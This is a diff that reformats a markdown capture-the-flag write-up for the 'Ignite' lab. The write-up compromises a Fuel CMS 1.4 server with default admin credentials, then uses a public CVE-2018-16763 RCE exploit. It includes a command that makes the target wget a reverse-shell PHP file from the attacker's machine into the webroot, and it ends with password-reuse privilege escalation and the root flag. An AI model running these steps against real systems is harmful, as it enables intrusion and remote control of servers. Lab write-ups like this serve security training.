@@ -1,16 +1,19 @@
 ---
 sticker: lucide//flame
 ---
-# ENUMERATION
----
 
+# IGNITE
 
+## ENUMERATION
 
-## OPEN PORTS
----
+***
+
+### OPEN PORTS
+
+***
 
 | PORT | SERVICE |
-| :--- | :------ |
+| ---- | ------- |
 | 80   | HTTP    |
 
 ```
@@ -24,48 +27,39 @@ PORT   STATE SERVICE REASON  VERSION
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 ```
 
-# RECONNAISSANCE
----
+## RECONNAISSANCE
 
+***
 
 We only got a website, let's check it out:
 
-
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250409164857.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250409164857.png)
 
 We are dealing with something called `Fuel CMS` at version `1.4`, let's check `robots.txt` since the entrance is allowed:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250409164943.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250409164943.png)
 
 We got a `/fuel` directory:
 
-
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250409165010.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250409165010.png)
 
 It takes us to a login page, if we take a deeper look at the main page, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250409165238.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250409165238.png)
 
 Maybe default credentials still work, let's try:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250409165313.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250409165313.png)
 
 There we go, default credentials work, let's proceed to exploitation phase.
 
+## EXPLOITATION
 
-
-# EXPLOITATION
----
-
+***
 
 Since we already got access to the admin panel, we can start searching for a way to get a shell, for example, since we already know we are dealing with `Fuel CMS 1.4`, we can take a look for any exploit:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250409165623.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250409165623.png)
 
 We got a `RCE` exploit on GitHub, this exploits CVE-2018-16763, if we search this CVE, we can find this information:
 
@@ -75,16 +69,15 @@ Description
 FUEL CMS 1.4.1 allows PHP Code Evaluation via the pages/select/ filter parameter or the preview/ data parameter. This can lead to Pre-Auth Remote Code Execution.
 ```
 
-
 Let's download the exploit and test:
 
 ```
 GITHUB: https://github.com/noraj/fuelcms-rce
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250409165739.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250409165739.png)
 
-There we go, we got `RCE`, we can download a reverse shell file and put it into the machine like this: 
+There we go, we got `RCE`, we can download a reverse shell file and put it into the machine like this:
 
 ```
 ruby exploit.rb http://10.10.172.18/ "wget+http://10.6.34.159:8000/thm_shell.php+-O+/var/www/html/shell.php"
@@ -92,7 +85,7 @@ ruby exploit.rb http://10.10.172.18/ "wget+http://10.6.34.159:8000/thm_shell.php
 
 We can see it gets downloaded:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250409171154.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250409171154.png)
 
 Now, we can simply visit:
 
@@ -102,13 +95,11 @@ http://IP/shell.php
 
 If we got our listener ready, we'll see the connection:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250409171256.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250409171256.png)
 
+## PRIVILEGE ESCALATION
 
-
-# PRIVILEGE ESCALATION
----
-
+***
 
 First step is to get a stable shell:
 
@@ -122,7 +113,7 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250409171335.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250409171335.png)
 
 We can read first flag:
 
@@ -133,12 +124,11 @@ www-data@ubuntu:/home/www-data$ cat flag.txt
 
 I used `linpeas` and found this, since there are no `4000 SUID` binaries or other stuff like that, maybe this will do to get root:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250409172944.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250409172944.png)
 
 We got a password, let's switch to root:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250409173005.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250409173005.png)
 
 Yeah, they reused the password for the database with the same as the bash console, let's get root flag:
 
@@ -147,7 +137,4 @@ root@ubuntu:/home/www-data# cat /root/root.txt
 b9bbcb33e11b80be759c4e844862482d
 ```
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250409173046.png)
-
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250409173046.png)
